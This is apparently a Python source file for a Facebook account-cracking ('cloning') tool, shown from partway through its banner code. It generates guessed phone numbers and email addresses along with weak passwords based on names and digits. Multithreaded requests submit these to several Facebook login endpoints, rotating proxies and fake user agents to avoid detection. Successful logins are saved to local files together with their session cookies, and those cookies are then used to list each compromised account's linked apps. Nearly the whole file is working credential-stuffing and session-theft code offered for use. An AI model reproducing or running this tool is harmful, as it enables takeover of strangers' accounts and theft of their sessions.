▐▄\x1b[0;91m•\x1b[0;97m ▄  ▄\x1b[0;91m·\x1b[0;97m ▄▌▄▄▄▄▄▄▄▄ \x1b[0;91m.\x1b[0;97m▄▄▄ \x1b[0;91m.\x1b[0;97m▄▄▄ \x1b[0;91m.\x1b[0;97m
  █▌█▌\x1b[0;91m▪\x1b[0;97m▐█\x1b[0;91m▪\x1b[0;97m██▌\x1b[0;91m•\x1b[0;97m██  ▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m
  \x1b[0;91m·\x1b[0;97m██\x1b[0;91m·\x1b[0;97m ▐█▌▐█\x1b[0;91m▪\x1b[0;97m ▐█\x1b[0;91m.▪\x1b[0;97m▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄
 \x1b[0;91m▪\x1b[0;97m▐█\x1b[0;91m·\x1b[0;97m█▌ ▐█▀\x1b[0;91m·.\x1b[0;97m ▐█▌\x1b[0;91m·\x1b[0;97m▐█▄▄▌▐█▄▄▌▐█▄▄▌ \x1b[1;91m•\033[93m•\x1b[1;92m•\x1b[1;97m
 \x1b[0;91m•\x1b[0;97m▀▀ ▀▀  ▀ \x1b[0;91m•\x1b[0;97m  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀ \033[1;31m\033[1;47mversion\033[0;0m\x1b[1;30m 1.2.1 \x1b[1;30m
\033[38;3;276;131;0;1m-----------------------------------------------------
 Author   : XYTEEE-XD
 Telegram : t.me/xyteee
 Tools    : \x1b[38;5;208mXYTEEE-XC\x1b[1;97m
 Status   : \x1b[38;5;42mPremium\x1b[1;97m
-----------------------------------------------------""")
#---------------------[Main-Menu]---------------------#
def rmain():
    clear();xyteee()
    print(" [1] crack from File")
    print(" [2] crack from number")
    print(" [3] crack from email")
    print(" [4] crack from searching \x1b[1;91m(Off)\x1b[1;97m")
    print(" [5] owner contact")
    print(" [0] exit program");print(led)
    xytee = input(f' Select Option : ')
    if xytee in ["1","01"]:
        file()
    elif xytee in ["2","02"]:
         rdm()
    elif xytee in ["3","03"]:
         mail()
    elif xytee in ["4","04"]:
         print('Wait it will launch very soon')
    elif xytee in ["5","05"]:
     os.system("xdg-open https://wa.me/+8801926890544");rmain()
    elif xytee in ["0","00"]:
     print(f' Exited Xyteee Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=61554748685443");time.sleep(3);os.system('xdg-open https://www.facebook.com/alphaxd.69');exit()
    else:
     print(f" Don't Select Wrong Options ");os.system("xdg-open https://t.me/xyteeetools");rmain()

#---------------------[File-Menu]---------------------#
def file():
	os.system('clear')
	xyteee();print(' \033[1;37mExample \033[1;31m: \033[1;32m/sdcard/Xyteee.py');print(led)
	o = input(' Put file path\033[1;31m :\x1b[1;90m ')
	print('\x1b[1;97m')
	try:lin = open(o).read().splitlines()
	except:
		print(' Wrong file given')
		time.sleep
		file()
	for xid in lin:
		id.append(xid)
	setting()
#---------------------[File-Setting]---------------------#
def setting():
    clear();xyteee();print(f' [1] New Ids Crack ');print(f' [2] Old Ids Crack');print(f' [3] Mix Ids Crack');print(led)
    hu = input(f' Select Option {M}:{A} ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:print('Wrong try again');exit();print('')
    print(led)
    xd_cp=input(f' Cloning Show cp Account ? y/n {M}:{A} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f' Cloning Show Cookie ? y/n {M}:{A} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    clear();xyteee();print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
    hc = input(f' Select Method {M}:{A} ')
    if hc in ['1','01']:method.append('md1')
    elif hc in ['2','02']:method.append('md2')
    elif hc in ['3','03']:method.append('md3')
    else:method.append('md1')
    clear();p4()
#---------------------[File-Method]---------------------#
def p4():
    os.system("clear");xyteee();print(dt);print(f' Total Dump File -> {H}'+str(len(id)));print(f' \x1b[38;5;208mTurn on & off flight (airplane) mode before use\033[1;37m');print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(frs+'@123')
            else:
                if len(frs)<3:pwv.append(nmf)
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(frs+'@123')
            if 'ya' in pwpluss:
                for xpwd in pwnya:pwv.append(xpwd)
            else:pass
            if 'md1' in method:pool.submit(md1,idf,pwv)
            elif 'md2' in method:pool.submit(md2,idf,pwv)
            elif 'md3' in method:pool.submit(md3,idf,pwv)
            else:pool.submit(md1,idf,pwv)
    print(f' Crack process has been Successful');rmain()
#---------------------[Random]---------------------#
def rdm():
    os.system("clear")
    xyteee()
    print(f"{P} [1] Random Cloning {M}({H}Fast{M})")
    print(f"{P} [2] Random Cloning {M}({H}Medium{M})")
    print(f"{P} [3] Random Cloning {M}({H}Slow{M})");print(led)
    xytee = input(f'{P} Select Option {M}:{A} ')
    if xytee in ["1","01"]:
        Fast()
    elif xytee in ["2","02"]:
        Medium()
    elif xytee in ["3","03"]:
        Slow()
#---------------------[Fast-Number]---------------------#
def Fast():
  user=[]
  os.system('clear');xyteee();print(dt);print(fast);print(led)
  kode = input(f'{P} Select Code : ');print(led);print(limitt);print(led)
  limit = int(input(f' Crack Limit : '));print(led)
  xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{P} Cloning Show Cookie ? y/n {M}:{A} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();xyteee();print(dt) #;print(f" {P}Number : "+kode);print(led)
  print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
  xc = input(f' Select Method {M}:{H} ')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=30) as xc_xytee:
    os.system('clear')
    tl = str(len(user))
    xyteee();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
    for guru in user:
      idf = kode+guru
      pwv=[idf,guru,guru[1:],idf[:6],idf[:7]]
      if xc in ['1','01']:xc_xytee.submit(md1,idf,pwv)
      elif xc in ['2','02']:xc_xytee.submit(md2,idf,pwv)
      elif xc in ['3','03']:xc_xytee.submit(md3,idf,pwv)
      else:
       xc_xytee.submit(md1,idf,pwv)
  print('');print(f'{P} Crack process has been Successful')
  input(f' Press Enter To Go Menu');Fast()
#---------------------[Medium-Number]---------------------#
def Medium():
  user=[]
  os.system('clear');xyteee();print(dt);print(medium);print(led)
  kode = input(f'{P} Select Code {M}:{A} ');print(led);print(limitt);print(led)
  limit = int(input(f' Crack Limit {M}:{A} '));print(led)
  xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{P} Cloning Show Cookie ?? y/n {M}:{A} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();xyteee();print(dt);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
  xc = input(f' Select Method {M}:{H} ')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(7))
    user.append(nmp)
  with tred(max_workers=30) as xc_xytee:
    os.system('clear')
    tl = str(len(user))
    xyteee();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
    for guru in user:
      idf = kode+guru
      pwv=[idf,guru,guru[1:],idf[:7],idf[:6],idf[:8]]
      if xc in ['1','01']:xc_xytee.submit(md1,idf,pwv)
      elif xc in ['2','02']:xc_xytee.submit(md2,idf,pwv)
      elif xc in ['3','03']:xc_xytee.submit(md3,idf,pwv)
      else:
       xc_xytee.submit(md1,idf,pwv)
  print('');print(f'{P} Crack process has been Successful')
  input(f' Press Enter To Go Menu');Medium()
#---------------------[Slow-Number]---------------------#
def Slow():
  user=[]
  os.system('clear');xyteee();print(dt);print(slow);print(led)
  kode = input(f'{P} Select Code {M}:{A} ');print(led);print(limitt);print(led)
  limit = int(input(f' Crack Limit {M}:{A} '));print(led)
  xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{P} Cloning Show Cookie ?? y/n {M}:{A} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();xyteee();print(dt);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
  xc = input(f'{P} Select Method {M}:{A} ')
  for nmbr in range(limit):
    koda = ''.join(random.choice(string.digits) for _ in range(2))
    kodb = ''.join(random.choice(string.digits) for _ in range(2))
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as xc_xytee:
    os.system('clear')
    tl = str(len(user))
    xyteee();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
    for guru in user:
      idf = kode+koda+kodb+guru
      pwv = [koda+kodb+guru,koda+kodb+guru[1:],idf,kode+koda+kodb,kode+koda+kodb[1:]] #,'@#@#@#','bangladesh','free fire','i love you']
      if xc in ['1','01']:xc_xytee.submit(md1,idf,pwv)
      elif xc in ['2','02']:xc_xytee.submit(md2,idf,pwv)
      elif xc in ['3','03']:xc_xytee.submit(md3,idf,pwv)
      else:
       xc_xytee.submit(md1,idf,pwv)
  print('');print(f'{P} Crack process has been Successful')
  input(f' Press Enter To Go Menu');Slow()
#---------------------[Mail-1]---------------------#
def mail():
    idf=[]
    os.system('clear');xyteee();print(fst);print(led)
    first = input(f' First Name {M}: {H}');print(led);print(lst);print(led)
    last = input(f' Last Name {M}: {H}');print(led);print(limitt);print(led)
    limit = int(input(f' Crack Limit {M}: {H}'))
    domain = '@gmail.com'
    print(led)
    xd_cp=input(f' Cloning Show cp Account ? y/n {M}:{A} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f' Cloning Show Cookie ? y/n {M}:{A} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    tkk = first+last
    os.system("clear");xyteee();print(f" {P}Gmail Name : {tkk[:4]}****{domain}");print(led);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
    mthd = input(f' Select Method :{H} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(3))
        idf.append(nmp)
    with tred(max_workers=40) as xyteee_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        os.system("clear");xyteee();print(f'{P} Gmail Name : {tk[:4]}***{domain}');print(f' Total Ids : '+idx);print(led)
        for number in idf:
            idf = first+'.'+last+number+domain
            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
            if mthd in ['1','01']:xyteee_xd.submit(md1,idf,pwv)
            elif mthd in ['2','02']:xyteee_xd.submit(md2,idf,pwv)
            elif mthd in ['3','03']:xyteee_xd.submit(md3,idf,pwv)
            else:
               xyteee_xd.submit(m5,idf,pwv)
    print('');print(f'{P} Crack process has been Successful')
    input(f' Press Enter To Go Menu');mail()
#---------------------[Method-1]---------------------#
def md1(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Xyteee-M1] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
  sys.stdout.flush()
  ua = random.choice(ugen)
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DYqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo%26code_challenge_method%3DS256%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd614149f-136e-431f-babf-db7f365bce91%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={
      "Host": "m.facebook.com",
      "content-length": f"{len(str(dataa))}",
      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
      "origin": "https://m.facebook.com",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": ua, #'Mozilla/5.0 (Linux; Android 11; CPH2159 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
      "accept": "*/*",
      "x-requested-with": "Linux",
      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
      "sec-ch-ua-platform": '"Android"',
      "sec-ch-ua-mobile": "?1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "sec-fetch-user": "?0",
      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
      "accept-encoding": "gzip, deflate br",
      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Xyteee-Cp] {idf}|{pw}{xxx}')
        open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{H} [Xyteee-Ok] {idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{B} Cookies {M}: {P}'+kuki)
        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(33)
  loop+=1
#---------------------[Method-2]---------------------#
def md2(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Xyteee-M2] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
  sys.stdout.flush()
  ua = random.choice(ugen)
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
      open('http.txt','w').write(proxs)
      nip = rc(proxs)
      proxs = {'http': 'socks4://'+nip}
      ses.headers.update({'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";                 v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'viewport-width': '980',
})
      p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
      dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";                 v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'viewport-width': '980',
}
      po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Xyteee-Cp] {idf}|{pw}{xxx}')
        open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{H} [Xyteee-Ok] {idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{B} Cookies {M}: {P}'+kuki)
        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(33)
  loop+=1
#---------------------[Method-3]---------------------#
def md3(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Xyteee-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),sys.stdout.flush()
  ua, ua2 = Ugen(),Ugen2()
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
      p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
      dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
      po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Xyteee-Cp] \x1b[38;5;208m{idf}|{pw}{xxx}')
        open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{H} [Xyteee-Ok] {idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{P} Cookies {M}:{P} '+kuki)
        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      waktu(31)
  loop+=1
#---------------------[Apk]---------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
#------------------[ USER-AGENT ]-------------------#
for xd in range(1000):
	rr = random.randint
	rc = random.choice
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-G960U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
	ugent2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; HUAWEI RIO-L01 Build/HuaweiRIO-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
	ugents3 = f"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B554a [FBAN/FBIOS;FBBV/12376726;FBDV/iPad2,5;FBMD/iPad;FBSN/iPhone OS;FBSV/7.0.4;FBSS/1; FBCR/;FBID/tablet;FBLC/en_GB;FBOP/1]"
	ugent4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; J9210 Build/55.2.A.4.229; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
	zaxxy = random.choice([ugent1,ugent2,ugents3,ugent4])
	ugen.append(zaxxy)

for xd in range(10000):
   rr = random.randint
   rc = random.choice
   win = ["Win64; x64)","WOW64)"]
   samsung = ["SAMSUNG SM-A3560","SAMSUNG SM-R875U","SAMSUNG SM-A356B/A356BXXU1AXBB","SAMSUNG SM-A356E","SAMSUNG SM-E546B","SAMSUNG SM-A155F","SAMSUNG SM-A256B","SAMSUNG SM-A256E"]
   ugent1 = f"Mozilla/5.0 (Windows NT 10.0; {str(rc(win))} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(70,120))}.0.0.0 Safari/537.36"
